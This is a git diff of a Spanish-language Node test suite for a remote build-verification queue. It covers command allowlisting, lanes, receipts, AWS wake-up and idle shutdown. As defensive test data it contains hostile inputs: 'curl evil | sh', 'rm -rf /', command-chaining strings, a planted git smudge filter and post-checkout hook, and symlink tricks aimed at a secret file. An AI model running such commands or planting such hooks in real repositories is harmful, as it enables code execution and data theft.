@@ -4,14 +4,15 @@
  */
 import assert from "node:assert/strict";
 import { execFileSync, spawn } from "node:child_process";
-import { existsSync, mkdirSync, mkdtempSync, readFileSync, readdirSync, rmSync, utimesSync, writeFileSync } from "node:fs";
+import { createHash } from "node:crypto";
 import { once } from "node:events";
+import { existsSync, mkdirSync, mkdtempSync, readdirSync, readFileSync, rmSync, statSync, utimesSync, writeFileSync } from "node:fs";
 import { createServer } from "node:http";
 import { tmpdir } from "node:os";
-import { join, resolve } from "node:path";
+import { dirname, join, resolve } from "node:path";
 import test from "node:test";
 
-import { createHttpServer, createQueue } from "../../scripts/verify-queue/server.mjs";
+import { checkConfig, createHttpServer, createQueue, resolveCommand } from "../../scripts/verify-queue/server.mjs";
 import { createWake } from "../../scripts/verify-remote.mjs";
 
 const verify = resolve(import.meta.dirname, "../../scripts/verify.mjs");
@@ -55,7 +56,7 @@ async function serve(t, queue) {
 
 /** Corre `verify.mjs --remote` como lo haría `pnpm verify --remote`. */
 async function client(cwd, host, args = [], env = {}) {
-  const child = spawn(process.execPath, [verify, "--remote", ...args], { cwd, env: { ...gitEnv, VERIFY_REMOTE_HOST: host, VERIFY_REMOTE_TERMINUS: "/nonexistent/terminus", VERIFY_REMOTE_AWS: "/nonexistent/aws", ...env } });
+  const child = spawn(process.execPath, [verify, "--remote", ...args], { cwd, env: { ...gitEnv, VERIFY_REMOTE_HOST: host, VERIFY_REMOTE_TERMINUS: "/nonexistent/terminus", VERIFY_REMOTE_AWS: "/nonexistent/aws", VERIFY_REMOTE_INSTANCE: "i-1", ...env } });
   let output = "";
   child.stdout.on("data", (chunk) => { output += chunk; });
   child.stderr.on("data", (chunk) => { output += chunk; });
@@ -65,7 +66,7 @@ async function client(cwd, host, args = [], env = {}) {
 
 test("corre por orden de llegada, una a la vez, con checkout limpio y target fija", { skip }, async (t) => {
   const { dir, repo, home } = workspace(t);
-  const queue = createQueue({ home, config, diskPercent: () => 10 });
+  const queue = createQueue({ home, config, sameUser: true, diskPercent: () => 10 });
   const trace = join(dir, "trace");
   const first = commit(repo, `
     ls -A >> ${trace}; echo "$CARGO_TARGET_DIR" >> ${trace}
@@ -88,7 +89,7 @@ test("corre por orden de llegada, una a la vez, con checkout limpio y target fij
 
 test("solo acepta un repo y un comando de su lista", { skip }, async (t) => {
   const { dir, repo, home } = workspace(t);
-  const queue = createQueue({ home, config, diskPercent: () => 10 });
+  const queue = createQueue({ home, config, sameUser: true, diskPercent: () => 10 });
   const sha = commit(repo, "true");
   await assert.rejects(queue.submit({ repo: "otro", commit: sha, command: "pnpm verify" }), /no corre el repo/);
   await assert.rejects(queue.submit({ repo: "terminus", commit: sha, command: "curl evil | sh" }), /no corre «curl evil/);
@@ -99,7 +100,7 @@ test("solo acepta un repo y un comando de su lista", { skip }, async (t) => {
 test("con el disco lleno borra la target y recompila una sola vez", { skip }, async (t) => {
   const { dir, repo, home } = workspace(t);
   let percent = 10;
-  const queue = createQueue({ home, config, diskPercent: () => percent });
+  const queue = createQueue({ home, config, sameUser: true, diskPercent: () => percent });
   const count = join(dir, "count");
   const sha = commit(repo, `
     echo x >> ${count}
@@ -125,7 +126,7 @@ test("con el disco lleno borra la target y recompila una sola vez", { skip }, as
 test("un fallo con el disco lleno a mitad de corrida borra la target y repite una vez", { skip }, async (t) => {
   const { dir, repo, home } = workspace(t);
   const full = join(dir, "full");
-  const queue = createQueue({ home, config, diskPercent: () => (existsSync(full) ? 90 : 10) });
+  const queue = createQueue({ home, config, sameUser: true, diskPercent: () => (existsSync(full) ? 90 : 10) });
   const count = join(dir, "count");
   const sha = commit(repo, `
     echo x >> ${count}
@@ -141,12 +142,12 @@ test("un fallo con el disco lleno a mitad de corrida borra la target y repite un
 test("una corrida que la cola no terminó se reporta interrumpida y la cola sigue", { skip }, async (t) => {
   const { dir, repo, home } = workspace(t);
   const sha = commit(repo, "echo hola");
-  const queue = createQueue({ home, config, diskPercent: () => 10 });
+  const queue = createQueue({ home, config, sameUser: true, diskPercent: () => 10 });
   const run = await queue.submit({ repo: "terminus", commit: sha, command: "pnpm verify", bundle: bundle(repo, dir) });
   await queue.settled();
   const meta = join(home, "runs", run.id, "meta.json");
   writeFileSync(meta, JSON.stringify({ ...queue.readRun(run.id), state: "running" }));
-  const reborn = createQueue({ home, config, diskPercent: () => 10 });
+  const reborn = createQueue({ home, config, sameUser: true, diskPercent: () => 10 });
   reborn.recover();
   await reborn.settled();
   assert.equal(reborn.readRun(run.id).state, "interrupted");
@@ -154,7 +155,7 @@ test("una corrida que la cola no terminó se reporta interrumpida y la cola sigu
 
 test("--remote devuelve el exit real y el log entero, y dice qué plataforma no cubre", { skip }, async (t) => {
   const { repo, home } = workspace(t);
-  const queue = createQueue({ home, config, diskPercent: () => 10 });
+  const queue = createQueue({ home, config, sameUser: true, diskPercent: () => 10 });
   const host = await serve(t, queue);
   commit(repo, "echo paso-visible; exit 7");
   const failed = await client(repo, host);
@@ -175,7 +176,7 @@ test("--remote devuelve el exit real y el log entero, y dice qué plataforma no 
 
 test("los cambios sin commit no se verifican en silencio", { skip }, async (t) => {
   const { repo, home } = workspace(t);
-  const host = await serve(t, createQueue({ home, config, diskPercent: () => 10 }));
+  const host = await serve(t, createQueue({ home, config, sameUser: true, diskPercent: () => 10 }));
   commit(repo, "true");
   writeFileSync(join(repo, "chain.sh"), "false");
   const { code, output } = await client(repo, host);
@@ -185,7 +186,7 @@ test("los cambios sin commit no se verifican en silencio", { skip }, async (t) =
 
 test("--attach retoma una corrida y repite el log; --cancel la corta", { skip }, async (t) => {
   const { repo, home } = workspace(t);
-  const queue = createQueue({ home, config, diskPercent: () => 10 });
+  const queue = createQueue({ home, config, sameUser: true, diskPercent: () => 10 });
   const host = await serve(t, queue);
   commit(repo, "echo largo; sleep 30");
   const child = spawn(process.execPath, [verify, "--remote"], { cwd: repo, env: { ...gitEnv, VERIFY_REMOTE_HOST: host } });
@@ -211,7 +212,7 @@ test("--attach retoma una corrida y repite el log; --cancel la corta", { skip },
 
 test("--detach encola y devuelve el id sin esperar", { skip }, async (t) => {
   const { repo, home } = workspace(t);
-  const queue = createQueue({ home, config, diskPercent: () => 10 });
+  const queue = createQueue({ home, config, sameUser: true, diskPercent: () => 10 });
   const host = await serve(t, queue);
   commit(repo, "echo despues");
   const { code, output } = await client(repo, host, ["--detach"]);
@@ -248,7 +249,7 @@ net.createServer((client) => {
 
 test("un host sin puerto llega a la cola por túnel SSH", { skip }, async (t) => {
   const { dir, repo, home } = workspace(t);
-  const host = await serve(t, createQueue({ home, config, diskPercent: () => 10 }));
+  const host = await serve(t, createQueue({ home, config, sameUser: true, diskPercent: () => 10 }));
   commit(repo, "echo por-tunel");
   const { code, output } = await client(repo, "vm-verify", [], { VERIFY_REMOTE_SSH: fakeSsh(dir, host.split(":")[1]) });
   assert.equal(code, 0, output);
@@ -282,7 +283,7 @@ test("sin Tailscale lo dice y no intenta encender", { skip }, async (t) => {
 
 test("el bundle temporal se borra al terminar", { skip }, async (t) => {
   const { dir, repo, home } = workspace(t);
-  const host = await serve(t, createQueue({ home, config, diskPercent: () => 10 }));
+  const host = await serve(t, createQueue({ home, config, sameUser: true, diskPercent: () => 10 }));
   commit(repo, "true");
   const temporary = join(dir, "tmp");
   mkdirSync(temporary);
@@ -309,7 +310,7 @@ test("la máquina apagada se enciende con las credenciales de quien lanza", { sk
   const aws = join(dir, "aws");
   const called = join(dir, "called");
   writeFileSync(aws, `#!/bin/sh\necho "$@" > ${called}\n`, { mode: 0o755 });
-  const queue = createQueue({ home, config, diskPercent: () => 10 });
+  const queue = createQueue({ home, config, sameUser: true, diskPercent: () => 10 });
   const server = createHttpServer(queue);
   server.listen(0, "127.0.0.1");
   await once(server, "listening");
@@ -386,7 +387,7 @@ function bothClis(t, danilAnswers, terminusAnswers) {
   const danil = danilAnswers ? fakeCli(dir, "danil", danilAnswers) : { path: join(dir, "no-danil"), calls: () => [] };
   const terminus = terminusAnswers ? fakeCli(dir, "terminus", terminusAnswers) : { path: join(dir, "no-terminus"), calls: () => [] };
   const aws = fakeCli(dir, "aws", [{ code: 0 }]);
-  const wake = createWake("vm-verify", { DANIL_CLI: danil.path, TERMINUS_CLI: terminus.path, VERIFY_REMOTE_AWS: aws.path });
+  const wake = createWake("vm-verify", { DANIL_CLI: danil.path, TERMINUS_CLI: terminus.path, VERIFY_REMOTE_AWS: aws.path, VERIFY_REMOTE_INSTANCE: "i-1" });
   return { wake, danil, terminus, aws };
 }
 
@@ -471,7 +472,7 @@ test("un CLI sin `machine` cae a aws", { skip }, (t) => {
 test("sin terminus cae a aws", { skip }, (t) => {
   const { dir } = workspace(t);
   const aws = fakeCli(dir, "aws", [{ code: 0 }]);
-  assert.equal(createWake("vm-verify", { VERIFY_REMOTE_TERMINUS: join(dir, "no-existe"), VERIFY_REMOTE_AWS: aws.path })().state, "started");
+  assert.equal(createWake("vm-verify", { VERIFY_REMOTE_TERMINUS: join(dir, "no-existe"), VERIFY_REMOTE_AWS: aws.path, VERIFY_REMOTE_INSTANCE: "i-1" })().state, "started");
   assert.equal(aws.calls().length, 1);
 });
 
@@ -486,10 +487,19 @@ for (const [code, words] of Object.entries(clearRefusals)) {
   });
 }
 
+test("sin el ID de la instancia no llama a aws y dice qué falta", { skip }, (t) => {
+  const { dir } = workspace(t);
+  const aws = fakeCli(dir, "aws", [{ code: 0 }]);
+  const { state, message } = createWake("vm-verify", { VERIFY_REMOTE_TERMINUS: join(dir, "no-existe"), VERIFY_REMOTE_AWS: aws.path })();
+  assert.equal(state, "failed");
+  assert.match(message, /VERIFY_REMOTE_INSTANCE/);
+  assert.deepEqual(aws.calls(), []);
+});
+
 test("aws reintenta IncorrectInstanceState y falla enseguida con lo demás", { skip }, (t) => {
   const { dir } = workspace(t);
   const aws = fakeCli(dir, "aws", [{ stderr: "An error occurred (IncorrectInstanceState) when calling StartInstances\n", code: 254 }, { stderr: "Unable to locate credentials\n", code: 253 }]);
-  const wake = createWake("vm-verify", { VERIFY_REMOTE_TERMINUS: join(dir, "no-existe"), VERIFY_REMOTE_AWS: aws.path });
+  const wake = createWake("vm-verify", { VERIFY_REMOTE_TERMINUS: join(dir, "no-existe"), VERIFY_REMOTE_AWS: aws.path, VERIFY_REMOTE_INSTANCE: "i-1" });
   assert.equal(wake().state, "retry");
   const { state, message } = wake();
   assert.equal(state, "failed");
@@ -498,7 +508,7 @@ test("aws reintenta IncorrectInstanceState y falla enseguida con lo demás", { s
 
 /** La cola apagada en un puerto conocido; `listen` la levanta cuando el encendido llega. */
 async function offlineQueue(t, home) {
-  const server = createHttpServer(createQueue({ home, config, diskPercent: () => 10 }));
+  const server = createHttpServer(createQueue({ home, config, sameUser: true, diskPercent: () => 10 }));
   server.listen(0, "127.0.0.1");
   await once(server, "listening");
   const { port } = server.address();
@@ -575,7 +585,7 @@ test("sin credenciales de AWS el encendido no se reintenta", { skip }, async (t)
 
 test("si la máquina cae al recibir el commit, lo manda otra vez", { skip }, async (t) => {
   const { repo, home } = workspace(t);
-  const inner = createHttpServer(createQueue({ home, config, diskPercent: () => 10 }));
+  const inner = createHttpServer(createQueue({ home, config, sameUser: true, diskPercent: () => 10 }));
   let dropped = false;
   const server = createServer((request, response) => {
     if (request.method === "POST" && request.url.startsWith("/runs?") && !dropped) {
@@ -614,6 +624,7 @@ function idleCheck(t, { sessions = [], processes = "", idleFor = 20 * MINUTE, fi
     utimesSync(stamp, now - idleFor, now - idleFor);
   }
   for (const [name, age] of Object.entries(files)) {
+    mkdirSync(dirname(join(home, name)), { recursive: true });
     writeFileSync(join(home, name), "");
     utimesSync(join(home, name), now - age, now - age);
   }
@@ -646,8 +657,8 @@ test("la máquina se apaga a los 15 minutos sin uso, no antes", { skip: idleSkip
 
 test("una corrida y una subida en curso cuentan como uso", { skip: idleSkip }, (t) => {
   assert.equal(idleCheck(t, { files: { busy: 0 } }), false);
-  assert.equal(idleCheck(t, { files: { "incoming-a.bundle": MINUTE } }), false);
-  assert.equal(idleCheck(t, { files: { "incoming-a.bundle": 20 * MINUTE } }), true, "una subida muerta deja de contar");
+  assert.equal(idleCheck(t, { files: { "incoming/a.bundle": MINUTE } }), false);
+  assert.equal(idleCheck(t, { files: { "incoming/a.bundle": 20 * MINUTE } }), true, "una subida muerta deja de contar");
 });
 
 test("una sesión cuenta hasta 2 horas y una que se cierra no cuenta", { skip: idleSkip }, (t) => {
@@ -662,4 +673,298 @@ test("una compilación cuenta hasta 2 horas", { skip: idleSkip }, (t) => {
   assert.equal(idleCheck(t, { processes: "60 node scripts/verify.mjs" }), false);
   assert.equal(idleCheck(t, { processes: `${3 * HOUR} node scripts/verify.mjs` }), true);
   assert.equal(idleCheck(t, { processes: "60 node /opt/verify-queue/server.mjs" }), true);
+});
+
+const repos = JSON.parse(readFileSync(resolve(import.meta.dirname, "../../scripts/verify-queue/repos.json"), "utf8"));
+const SHA = "a".repeat(40);
+
+test("repos.json se carga y cada perfil corre con su propio usuario", () => {
+  checkConfig(repos);
+  for (const [repo, profile] of Object.entries(repos.repos)) assert.ok(profile.user, `${repo} sin usuario de corrida`);
+  assert.notEqual(repos.repos.terminus.user, repos.repos["danil-engine"].user, "una rama de un repo no escribe el carril del otro");
+});
+
+test("los trabajos del motor se traducen a argv fijo y validan cada token", () => {
+  const engine = repos.repos["danil-engine"];
+  const values = { commit: SHA, base: SHA, jobs: 8 };
+  assert.deepEqual(resolveCommand(engine, "verify", values).argv, ["python3", "scripts/verify", "--base", SHA]);
+  assert.deepEqual(resolveCommand(engine, "verify --all", { ...values, base: null }).argv, ["python3", "scripts/verify", "--all"]);
+  assert.deepEqual(resolveCommand(engine, "verify --only connector,cli-run", values).argv, ["python3", "scripts/verify", "--base", SHA, "--only", "connector,cli-run"]);
+  assert.deepEqual(resolveCommand(engine, "e2e connector", values).argv, ["python3", "scripts/verify", "--no-lint", "--only", "connector"]);
+  assert.deepEqual(resolveCommand(engine, "test --package seldon-runtime wire::round", values).argv, ["cargo", "test", "--locked", "-j", "8", "--package", "seldon-runtime", "--", "wire::round"]);
+  assert.deepEqual(resolveCommand(engine, "test", values).argv, ["cargo", "test", "--locked", "-j", "8", "--"]);
+  assert.equal(resolveCommand(engine, "rm -rf /", values), null);
+  assert.equal(resolveCommand(repos.repos.terminus, "pnpm verify; curl x", values), null);
+  const refused = [
+    ["verify", { ...values, base: null }, /necesita base/],
+    ["verify --all --all", values, /una sola vez/],
+    ["verify  --all", values, /espacios/],
+    ["verify --only", values, /no admite ese valor/],
+    ["verify --only --all", values, /no admite ese valor/],
+    ["verify --only a;b", values, /no admite ese valor/],
+    ["test --nocapture", values, /no admite --nocapture/],
+    ["test -Zunstable", values, /no admite -Zunstable/],
+    ["test a b", values, /no admite «b»/],
+    ["e2e", values, /necesita el nombre del E2E/],
+    [`test ${Array(17).fill("--lib").join(" ")}`, values, /más de 16/],
+  ];
+  for (const [command, given, pattern] of refused) assert.throws(() => resolveCommand(engine, command, given), pattern, command);
+});
+
+test("repos.json mal formado no arranca la cola", () => {
+  const jobs = { verify: { argv: ["x"] } };
+  assert.throws(() => checkConfig({ repos: { r: { jobs: { verify: { argv: ["x", "--base", "{base}"] } } } } }), /base\.argv/);
+  assert.throws(() => checkConfig({ repos: { r: { jobs, env: { HOME: "/x" } } } }), /env HOME/);
+  assert.throws(() => checkConfig({ repos: { r: { jobs, env: { CARGO_TARGET_DIR: "/x" } } } }), /env CARGO_TARGET_DIR/);
+  assert.throws(() => checkConfig({ repos: { r: { jobs, artifacts: ["../x"] } } }), /dentro del checkout/);
+  assert.throws(() => checkConfig({ repos: { r: { jobs, commands: ["x"] } } }), /no los dos/);
+});
+
+/** Un perfil como el del motor: la cadena es un `chain.sh` del commit que escribe lo que el motor escribiría. */
+const engineConfig = {
+  repos: {
+    engine: {
+      target: "checkout",
+      env: { HARNESS_BUILD_COMMIT: "{commit}" },
+      fresh: ["target/verify"],
+      artifacts: ["target/verify/*/summary.json", "target/verify/*/*.log"],
+      receipt: { summary: "target/verify/*/summary.json", digests: { bin: "target/debug/bin" } },
+      jobs: { verify: { argv: ["bash", "chain.sh", "{options}"], base: { argv: ["--base", "{base}"], unless: ["--all"] }, options: { "--all": null } } },
+    },
+  },
+};
+
+async function engineRun(t, queue, repo, dir, chain, extra = {}) {
+  const sha = commit(repo, chain);
+  const run = await queue.submit({ repo: "engine", commit: sha, command: "verify --all", bundle: bundle(repo, dir), ...extra });
+  await queue.settled();
+  return { sha, run: queue.readRun(run.id), id: run.id };
+}
+
+const summaryChain = (status = "PASS") => `
+  set -e
+  echo "args:$*"; echo "build:$HARNESS_BUILD_COMMIT"; echo "home:$HOME"; ls target/verify 2>/dev/null | sed 's/^/vieja:/' || true
+  mkdir -p target/verify/r1 target/debug
+  printf '{"results":[{"name":"build","status":"PASS","seconds":12.0},{"name":"durable-pending","status":"${status}","seconds":3}]}' > target/verify/r1/summary.json
+  echo log > target/verify/r1/build.log
+  printf binario > target/debug/bin`;
+
+test("el perfil del motor: target dentro del checkout, artefactos y recibo con checks", { skip }, async (t) => {
+  const { dir, repo, home } = workspace(t);
+  const queue = createQueue({ home, config: engineConfig, sameUser: true, diskPercent: () => 10 });
+  const host = await serve(t, queue);
+  const { sha, run, id } = await engineRun(t, queue, repo, dir, summaryChain("KNOWN"));
+  assert.equal(run.state, "passed", readFileSync(queue.logPath(id), "utf8"));
+  const log = readFileSync(queue.logPath(id), "utf8");
+  assert.match(log, /args:--all/);
+  assert.match(log, new RegExp(`build:${sha}`));
+  assert.ok(existsSync(join(queue.lanePaths("engine").target, "debug/bin")), "la target del checkout sobrevive a git clean");
+  assert.ok(existsSync(join(home, "runs", id, "artifacts/target/verify/r1/build.log")));
+
+  const response = await fetch(`http://${host}/runs/${id}/receipt`);
+  const bytes = Buffer.from(await response.arrayBuffer());
+  assert.equal(response.headers.get("x-receipt-sha256"), createHash("sha256").update(bytes).digest("hex"));
+  assert.equal(queue.readRun(id).receiptSha256, response.headers.get("x-receipt-sha256"));
+  const receipt = JSON.parse(bytes);
+  assert.equal(receipt.commit, sha);
+  assert.equal(receipt.tree, git(repo, "rev-parse", `${sha}^{tree}`));
+  assert.equal(receipt.state, "passed");
+  assert.equal(receipt.exit_code, 0);
+  assert.equal(receipt.wip, false);
+  assert.equal(receipt.lane_previous_commit, null);
+  assert.deepEqual(receipt.checks, [{ name: "build", status: "PASS", seconds: 12 }, { name: "durable-pending", status: "KNOWN", seconds: 3 }]);
+  assert.deepEqual(receipt.known_failures, ["durable-pending"]);
+  assert.equal(receipt.artifacts.bin, `sha256:${createHash("sha256").update("binario").digest("hex")}`);
+  assert.equal("receipt_sha256" in receipt, false, "el hash va fuera del recibo");
+
+  const second = await engineRun(t, queue, repo, dir, `${summaryChain()}\n# otra`);
+  assert.doesNotMatch(readFileSync(queue.logPath(second.id), "utf8"), /vieja:/, "fresh borra target/verify antes de correr");
+  assert.equal(queue.receiptBytes(second.id) && JSON.parse(queue.receiptBytes(second.id)).lane_previous_commit, sha);
+});
+
+test("checks es null si la corrida no deja exactamente un summary.json válido", { skip }, async (t) => {
+  const { dir, repo, home } = workspace(t);
+  const queue = createQueue({ home, config: engineConfig, sameUser: true, diskPercent: () => 10 });
+  const none = await engineRun(t, queue, repo, dir, "exit 3");
+  assert.equal(none.run.state, "failed");
+  assert.equal(JSON.parse(queue.receiptBytes(none.id)).checks, null);
+  assert.equal(JSON.parse(queue.receiptBytes(none.id)).exit_code, 3);
+  const two = await engineRun(t, queue, repo, dir, `${summaryChain()}; mkdir -p target/verify/r2; cp target/verify/r1/summary.json target/verify/r2/`);
+  assert.equal(JSON.parse(queue.receiptBytes(two.id)).checks, null);
+  assert.match(readFileSync(queue.logPath(two.id), "utf8"), /2 archivos/);
+  const bad = await engineRun(t, queue, repo, dir, summaryChain("GREEN"));
+  assert.equal(JSON.parse(queue.receiptBytes(bad.id)).checks, null);
+});
+
+test("un artefacto enlazado, bajo un directorio enlazado o con enlace duro no se copia", { skip }, async (t) => {
+  const { dir, repo, home } = workspace(t);
+  const secret = join(dir, "secret");
+  mkdirSync(secret);
+  writeFileSync(join(secret, "summary.json"), '{"results":[{"name":"robado","status":"PASS","seconds":1}]}');
+  writeFileSync(join(secret, "x.log"), "secreto");
+  const queue = createQueue({ home, config: engineConfig, sameUser: true, diskPercent: () => 10 });
+  const linked = await engineRun(t, queue, repo, dir, `mkdir -p target/verify/r1; ln -s ${secret}/summary.json target/verify/r1/summary.json; ln ${secret}/x.log target/verify/r1/x.log`);
+  assert.equal(existsSync(join(home, "runs", linked.id, "artifacts")), false);
+  assert.equal(JSON.parse(queue.receiptBytes(linked.id)).checks, null);
+  const parent = await engineRun(t, queue, repo, dir, `mkdir -p target; ln -s ${secret} target/verify-real; mkdir -p target/verify; ln -s ${secret} target/verify/r1`);
+  assert.equal(existsSync(join(home, "runs", parent.id, "artifacts")), false);
+  assert.equal(readFileSync(join(secret, "x.log"), "utf8"), "secreto");
+});
+
+test("un archivo sin cambios entre dos commits conserva su mtime: cargo no lo recompila", { skip }, async (t) => {
+  const { dir, repo, home } = workspace(t);
+  const queue = createQueue({ home, config: engineConfig, sameUser: true, diskPercent: () => 10 });
+  writeFileSync(join(repo, "lib.rs"), "fn quieto() {}\n");
+  await engineRun(t, queue, repo, dir, "true");
+  const file = join(queue.lanePaths("engine").checkout, "lib.rs");
+  const before = statSync(file).mtimeMs;
+  await new Promise((done) => setTimeout(done, 1100));
+  await engineRun(t, queue, repo, dir, "echo cambia");
+  assert.equal(statSync(file).mtimeMs, before);
+});
+
+test("sin usuario de corrida la cola no corre la rama, salvo en pruebas", { skip }, async (t) => {
+  const { dir, repo, home } = workspace(t);
+  const queue = createQueue({ home, config: engineConfig, diskPercent: () => 10 });
+  const sha = commit(repo, "true");
+  await assert.rejects(queue.submit({ repo: "engine", commit: sha, command: "verify --all", bundle: bundle(repo, dir) }), (error) => error.status === 503 && /usuario de corrida/.test(error.message));
+});
+
+test("base debe ser ancestro, y una foto wip dice el HEAD que tiene debajo", { skip }, async (t) => {
+  const { dir, repo, home } = workspace(t);
+  const queue = createQueue({ home, config: engineConfig, sameUser: true, diskPercent: () => 10 });
+  const root = commit(repo, "true");
+  await assert.rejects(queue.submit({ repo: "engine", commit: root, command: "verify --all", bundle: bundle(repo, dir), wip: true }), /exactamente un padre/);
+  const head = commit(repo, "true");
+  git(repo, "checkout", "-q", "--detach", root);
+  const side = commit(repo, "echo lado");
+  git(repo, "checkout", "-q", "-");
+  await assert.rejects(queue.submit({ repo: "engine", commit: head, command: "verify", base: side, bundle: bundle(repo, dir) }), /no es ancestro/);
+  const { run, id } = await engineRun(t, queue, repo, dir, 'echo "args:$*"', { wip: true });
+  assert.equal(run.head, head);
+  assert.equal(JSON.parse(queue.receiptBytes(id)).wip, true);
+  const based = await queue.submit({ repo: "engine", commit: run.commit, command: "verify", base: root });
+  await queue.settled();
+  assert.match(readFileSync(queue.logPath(based.id), "utf8"), new RegExp(`args:--base ${root}`));
+});
+
+test("lo que una corrida deja en .git del carril no corre en la siguiente", { skip }, async (t) => {
+  const { dir, repo, home } = workspace(t);
+  const queue = createQueue({ home, config: engineConfig, sameUser: true, diskPercent: () => 10 });
+  const ran = join(dir, "filtro-corrio");
+  writeFileSync(join(repo, "x.txt"), "uno\n");
+  const plant = `
+    git config filter.evil.smudge "sh -c 'touch ${ran}; cat'"
+    git config include.path /dev/null
+    mkdir -p .git/info; echo "*.txt filter=evil" > .git/info/attributes
+    printf '#!/bin/sh\ntouch ${ran}\n' > .git/hooks/post-checkout; chmod +x .git/hooks/post-checkout`;
+  const first = await engineRun(t, queue, repo, dir, plant);
+  assert.equal(first.run.state, "passed", readFileSync(queue.logPath(first.id), "utf8"));
+  rmSync(ran, { force: true });
+  writeFileSync(join(repo, "x.txt"), "dos\n");
+  const second = await engineRun(t, queue, repo, dir, "git config --get filter.evil.smudge && exit 9; cat x.txt");
+  assert.equal(second.run.state, "passed", readFileSync(queue.logPath(second.id), "utf8"));
+  assert.equal(existsSync(ran), false, "ni el filtro ni el hook corrieron en el checkout de la segunda");
+  assert.equal(readFileSync(join(queue.lanePaths("engine").checkout, "x.txt"), "utf8"), "dos\n");
+});
+
+test("un .git que la rama cambió por un archivo se rehace", { skip }, async (t) => {
+  const { dir, repo, home } = workspace(t);
+  const queue = createQueue({ home, config: engineConfig, sameUser: true, diskPercent: () => 10 });
+  const first = await engineRun(t, queue, repo, dir, `rm -rf .git; echo "gitdir: ${dir}" > .git`);
+  assert.equal(first.run.state, "passed");
+  const second = await engineRun(t, queue, repo, dir, "echo sano");
+  assert.equal(second.run.state, "passed", readFileSync(queue.logPath(second.id), "utf8"));
+  assert.match(readFileSync(queue.logPath(second.id), "utf8"), /sano/);
+});
+
+test("con dos carriles corren dos a la vez, la tercera espera, y cada una recibe la mitad de los núcleos", { skip }, async (t) => {
+  const { dir, repo, home } = workspace(t);
+  const trace = join(dir, "trace");
+  const lanesConfig = { lanes: 2, repos: { engine: { ...engineConfig.repos.engine, fresh: [], receipt: undefined, artifacts: [], jobs: { verify: { argv: ["bash", "chain.sh", "{jobs}"], options: { "--all": null } } } } } };
+  const queue = createQueue({ home, config: lanesConfig, sameUser: true, cpus: 8, diskPercent: () => 10 });
+  const chain = (name) => `echo "inicio-${name} $1" >> ${trace}; echo "tmp $TMPDIR" >> ${trace}; sleep 0.6; echo "fin-${name}" >> ${trace}`;
+  const ids = [];
+  for (const name of ["a", "b", "c"]) {
+    const sha = commit(repo, chain(name));
+    ids.push((await queue.submit({ repo: "engine", commit: sha, command: "verify", bundle: bundle(repo, dir) })).id);
+  }
+  await queue.settled();
+  const all = readFileSync(trace, "utf8").trim().split("\n");
+  const lines = all.filter((line) => !line.startsWith("tmp "));
+  assert.deepEqual(lines.slice(0, 2).sort(), ["inicio-a 4", "inicio-b 4"], "dos a la vez, con 8/2 núcleos cada una");
+  assert.ok(lines.indexOf("inicio-c 4") > Math.min(lines.indexOf("fin-a"), lines.indexOf("fin-b")), "la tercera espera un carril libre");
+  const runs = ids.map((id) => queue.readRun(id));
+  assert.deepEqual(runs.map((run) => run.state), ["passed", "passed", "passed"]);
+  assert.deepEqual(runs.slice(0, 2).map((run) => run.lane).sort(), [0, 1]);
+  assert.equal(JSON.parse(queue.receiptBytes(ids[0])).lane, String(runs[0].lane));
+  assert.equal(existsSync(join(home, "busy")), false);
+  const tmps = new Set(all.filter((line) => line.startsWith("tmp ")));
+  assert.equal(tmps.size, 2, "cada carril tiene su TMPDIR: los candados de /tmp no cruzan carriles");
+});
+
+test("un repo vuelve al carril libre donde ya está caliente", { skip }, async (t) => {
+  const { dir, repo, home } = workspace(t);
+  const lanesConfig = { lanes: 3, repos: { engine: { ...engineConfig.repos.engine, fresh: [], receipt: undefined, artifacts: [] } } };
+  const queue = createQueue({ home, config: lanesConfig, sameUser: true, diskPercent: () => 10 });
+  const first = await engineRun(t, queue, repo, dir, "true");
+  assert.equal(first.run.lane, 0);
+  const second = await engineRun(t, queue, repo, dir, "echo otra");
+  assert.equal(second.run.lane, 0, "el carril 0 ya tiene el checkout y la target");
+  assert.throws(() => checkConfig({ lanes: 0, repos: {} }), /lanes/);
+  assert.throws(() => checkConfig({ lanes: 9, repos: {} }), /lanes/);
+});
+
+test("--wip manda la foto del árbol sobre HEAD y el recibo lo dice", { skip }, async (t) => {
+  const { repo, home } = workspace(t);
+  const queue = createQueue({ home, config, sameUser: true, diskPercent: () => 10 });
+  const host = await serve(t, queue);
+  const head = commit(repo, "echo comprometido");
+  writeFileSync(join(repo, "chain.sh"), "echo sin-commit");
+  writeFileSync(join(repo, "nuevo.txt"), "x");
+  const { code, output } = await client(repo, host, ["--wip"]);
+  assert.equal(code, 0, output);
+  assert.match(output, /sin-commit/);
+  assert.match(output, new RegExp(`foto wip sobre ${head.slice(0, 10)}`));
+  const [run] = queue.allRuns();
+  assert.equal(run.wip, true);
+  assert.equal(run.head, head);
+  assert.equal(JSON.parse(queue.receiptBytes(run.id)).wip, true);
+  assert.equal(git(repo, "rev-parse", "HEAD"), head, "la foto no mueve HEAD");
+  assert.match(git(repo, "status", "--porcelain"), /nuevo\.txt/, "ni toca el índice ni los archivos");
+  assert.equal(git(repo, "for-each-ref", "refs/verify-remote/"), "");
+});
+
+test("--wip sin cambios manda HEAD tal cual", { skip }, async (t) => {
+  const { repo, home } = workspace(t);
+  const queue = createQueue({ home, config, sameUser: true, diskPercent: () => 10 });
+  const host = await serve(t, queue);
+  const head = commit(repo, "echo limpio");
+  const { code, output } = await client(repo, host, ["--wip"]);
+  assert.equal(code, 0, output);
+  const [run] = queue.allRuns();
+  assert.equal(run.commit, head);
+  assert.equal(run.wip, false);
+  assert.equal((await client(repo, host, ["--wip", "--commit", head])).code, 2);
+});
+
+test("el git del carril lee un espejo de otro dueño: safe.directory llega al upload-pack del fetch local", { skip }, async (t) => {
+  const { dir, repo, home } = workspace(t);
+  // Con un remoto local git quita los `-c` del entorno de upload-pack; este git falso hace que todo
+  // repo parezca de otro dueño cuando corre como git del carril, igual que verify-run frente al espejo.
+  const bin = join(dir, "bin");
+  mkdirSync(bin);
+  const real = execFileSync("sh", ["-c", "command -v git"], { encoding: "utf8" }).trim();
+  writeFileSync(join(bin, "git"), `#!/bin/sh\n[ -n "$GIT_CONFIG_GLOBAL" ] && export GIT_TEST_ASSUME_DIFFERENT_OWNER=1\nexec ${real} "$@"\n`, { mode: 0o755 });
+  const path = process.env.PATH;
+  process.env.PATH = `${bin}:${path}`;
+  t.after(() => {
+    process.env.PATH = path;
+  });
+  const queue = createQueue({ home, config: engineConfig, sameUser: true, diskPercent: () => 10 });
